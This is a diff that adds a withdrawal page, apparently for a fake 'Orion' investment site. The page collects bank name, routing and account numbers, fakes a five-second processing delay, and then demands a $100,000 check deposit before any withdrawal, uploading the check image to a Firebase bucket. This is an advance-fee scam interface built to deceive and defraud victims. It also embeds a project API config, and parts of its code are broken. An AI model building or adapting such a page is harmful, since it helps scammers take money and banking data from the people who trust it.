@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orion Withdrawal Form</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
+    <!-- Toastify CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <style>
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-left-color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Style for the popup overlay */
+        #checkDeposit {
+            background-color: rgba(0, 0, 0, 0.5);
+            /* Removed display: none; */
+        }
+    </style>
+</head>
+
+<body class="bg-gray-100 font-roboto">
+    <div class="flex items-center justify-center h-screen">
+        <div class="bg-white p-8 rounded-lg shadow-lg max-w-lg w-full space-y-6">
+            <h2 class="text-2xl font-bold text-gray-800 text-center mb-4">Orion Withdrawal Form</h2>
+            <p class="text-gray-600 text-center mb-6">Securely withdraw your funds by filling in the details below.</p>
+
+            <!-- Form -->
+            <form id="withdrawForm" class="space-y-6">
+                <!-- Bank Name Input -->
+                <div>
+                    <label for="bankName" class="block text-sm font-medium text-gray-700">Bank Name</label>
+                    <input id="bankName" name="bankName" type="text" placeholder="Enter your bank name"
+                        class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                        required>
+                </div>
+
+                <!-- Routing Number Input -->
+                <div>
+                    <label for="routingNumber" class="block text-sm font-medium text-gray-700">Routing Number</label>
+                    <input id="routingNumber" name="routingNumber" type="number" placeholder="Enter routing number"
+                        class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                        required>
+                </div>
+
+                <!-- Account Number Input -->
+                <div>
+                    <label for="accountNumber" class="block text-sm font-medium text-gray-700">Account Number</label>
+                    <input id="accountNumber" name="accountNumber" type="number" placeholder="Enter account number"
+                        class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                        required>
+                </div>
+
+                <!-- Amount Input -->
+                <div>
+                    <label for="amount" class="block text-sm font-medium text-gray-700">Amount</label>
+                    <input id="amount" name="amount" type="number" placeholder="Enter amount"
+                        class="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                        required>
+                </div>
+
+                <!-- Button Group -->
+                <div class="flex justify-between items-center">
+                    <button id="cancelBtn" type="button"
+                        class="py-2 px-6 bg-gray-300 hover:bg-gray-400 text-gray-800 rounded-md shadow transition">
+                        Cancel
+                    </button>
+                    <button id="withdrawBtn" type="submit"
+                        class="flex items-center justify-center space-x-2 py-2 px-6 bg-indigo-600 hover:bg-indigo-700 text-white font-medium rounded-md shadow transition transform hover:scale-105">
+                        <span>Withdraw</span>
+                        <div id="spinner" class="spinner hidden"></div>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Check Deposit Popup -->
+    <div id="checkDeposit" class="checkDeposit hidden fixed inset-0 flex items-center justify-center">
+        <div class="relative max-w-lg mx-auto p-6 bg-white rounded-lg shadow-lg border border-gray-200 mt-10">
+            <!-- Cancel Button -->
+            <button id="cClosePopup"
+                class="absolute top-2 right-2 text-gray-400 hover:text-red-600 transition duration-300">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24"
+                    stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                </svg>
+            </button>
+
+            <h2 class="text-2xl font-bold text-gray-800 mb-3">Deposit Required</h2>
+            <p class="text-gray-600 mb-2">To access your investment withdrawals, please submit a check deposit to your
+                account.</p>
+
+            <!-- File Upload Section -->
+            <div class="mt-4">
+                <label class="block text-sm font-semibold text-red-600 mb-1" for="checkImage">Upload Check
+                    Image*</label>
+                <div id="uploadArea"
+                    class="flex items-center justify-center w-full p-4 border-4 border-dashed border-red-500 rounded-lg cursor-pointer hover:bg-red-50 transition duration-300">
+                    <input type="file" id="checkImage" accept="image/*" class="hidden" />
+                    <span class="text-red-500 font-semibold">Click here to upload your check</span>
+                </div>
+            </div>
+
+            <!-- Emphasis on Check Amount -->
+            <div class="mt-6 bg-yellow-100 p-4 rounded-md border-l-4 border-yellow-500">
+                <p class="text-center text-xl font-bold text-yellow-800">$100,000.00 Check</p>
+            </div>
+
+            <!-- Reason for Limitation -->
+            <p class="mt-4 text-sm text-gray-500 italic">Please note: For security purposes and to maintain the
+                integrity of your investment, withdrawals are only enabled after a successful check deposit of
+                $100,000.00.</p>
+
+            <!-- Submit Button -->
+            <div class="mt-6 flex justify-end">
+                <button
+                    class="bg-blue-600 text-white font-bold px-6 py-2 rounded-md hover:bg-blue-700 transition duration-300">Submit
+                    Deposit</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toastify JS -->
+    <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore-compat.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDTkXjNDPdbOeo32CaCkglIy-6nzuszEJM",
+            authDomain: "orion-investment-2b141.firebaseapp.com",
+            projectId: "orion-investment-2b141",
+            storageBucket: "orion-investment-2b141.appspot.com",
+            messagingSenderId: "911866094162",
+            appId: "1:911866094162:web:bfe2dc2323995f4585358b",
+            measurementId: "G-12SQKBDR1S"
+        };
+
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        const auth = firebase.auth();
+    </script>
+
+    <script>
+        // Firebase Config
+        
+        // Handle form submission
+        document.getElementById("withdrawForm").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const withdrawBtn = document.getElementById("withdrawBtn");
+            const spinner = document.getElementById("spinner");
+            const bankName = document.getElementById("bankName").value;
+            const routingNumber = document.getElementById("routingNumber").value;
+            const accountNumber = document.getElementById("accountNumber").value;
+            const amount = document.getElementById("amount").value;
+
+            // Show spinner and disable button
+            spinner.classList.remove("hidden");
+            withdrawBtn.disabled = true;
+
+            setTimeout(() => {
+                spinner.classList.add("hidden");
+                withdrawBtn.disabled = false;
+
+                // Show check deposit popup
+                const checkDeposit = document.getElementById("checkDeposit");
+                checkDeposit.classList.remove("hidden");
+
+                // Toast notification
+                Toastify({
+                    text: "To access your investment withdrawals, please submit a check deposit to your account.",
+                    duration: 3000,
+                    gravity: "top",
+                    position: "center",
+                    backgroundColor: "#F24C00"
+                }).showToast();
+            }, 5000);
+        });
+
+        // Close check deposit popup
+        document.getElementById("cClosePopup").addEventListener("click", () => {
+            document.getElementById("checkDeposit").classList.add("hidden");
+        });
+
+        // Cancel button functionality
+        document.getElementById("cancelBtn").addEventListener("click", () => {
+            window.location.href = "./card.html"; // Replace with your redirect page
+        });
+    </script>
+</body>
+
+</html>
+
+
+
+<script>
+    // Add click event to the upload area to trigger file input
+    document.getElementById('uploadArea').addEventListener('click', () => {
+      document.getElementById('checkImage').click();
+    });
+  
+    // Add change event to handle file selection and upload
+    document.getElementById('checkImage').addEventListener('change', async function (e) {
+      const file = e.target.files[0]; // Get the uploaded file
+      if (file) {
+        // Display a message that upload has started
+        const uploadMessage = document.getElementById('uploadMessage');
+        uploadMessage.classList.remove('hidden');
+        uploadMessage.textContent = 'Uploading check image...';
+  
+        try {
+          // Create a storage reference
+          const storageRef = firebase.storage().ref(`checks/${file.name}`);
+  
+          // Upload the file
+          const uploadTask = storageRef.put(file);
+  
+          // Monitor upload progress
+          uploadTask.on('state_changed', snapshot => {
+            // Calculate progress percentage
+            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+            uploadMessage.textContent = `Upload is ${progress.toFixed(0)}% done`;
+          }, error => {
+            console.error('Error during upload:', error);
+            uploadMessage.textContent = 'Upload failed. Please try again.';
+          }, async () => {
+            // Get the file's download URL after upload completes
+            const downloadURL = await uploadTask.snapshot.ref.getDownloadURL();
+            console.log('File available at', downloadURL);
+  
+            // Show success message and file URL
+            uploadMessage.textContent = 'Upload successful! Check image uploaded.';
+          });
+        } catch (error) {
+          console.error('Error uploading file:', error);
+          uploadMessage.textContent = 'An error occurred. Please try again.';
+        }
+      }
+    });
+  </script>
+  
